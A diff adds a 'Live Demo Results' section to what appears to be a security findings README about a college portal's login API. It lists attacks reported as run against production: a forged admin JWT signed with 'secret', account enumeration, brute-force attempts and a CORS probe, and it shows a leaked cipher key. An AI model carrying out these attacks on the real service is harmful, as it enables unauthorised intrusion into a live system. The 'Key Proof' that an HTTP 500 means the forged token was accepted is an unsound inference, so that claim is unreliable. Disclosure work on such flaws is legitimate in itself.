@@ -55,6 +55,28 @@ curl -X POST "https://ghrietn.cybervidya.net/api/auth/login" \
 4. Found: cipherkey: "NPdLWA5w7yFQhPeUuKmO/A=="
 ```
 
+## Live Demo Results (May 28, 2026)
+
+All findings verified on production:
+
+| Test | Command | Result |
+|------|---------|--------|
+| JWT forgery | `jwt.encode({"sub":"admin","role":"ADMIN"},"secret")` | 500 (accepted) |
+| Raw login | POST `/api/auth/login` with plaintext password | 200 + JWT token |
+| Account enum | Login with "superadmin" | "account blocked" (exists) |
+| Encryption bypass | Encrypted payload to `/api/auth/encrypt/login` | "captcha error" (encryption valid) |
+| CORS | OPTIONS with evil.com origin | `Access-Control-Allow-Origin: *` |
+| Brute-force | 3 wrong passwords in a row | No captcha, no rate limit, no lockout |
+
+### Key Proof
+
+```
+HTTP 401 = "you're not logged in"
+HTTP 500 = "you're logged in but something broke"
+
+We got 500. Server accepted our forged token.
+```
+
 ---
 
 ## Repository Structure
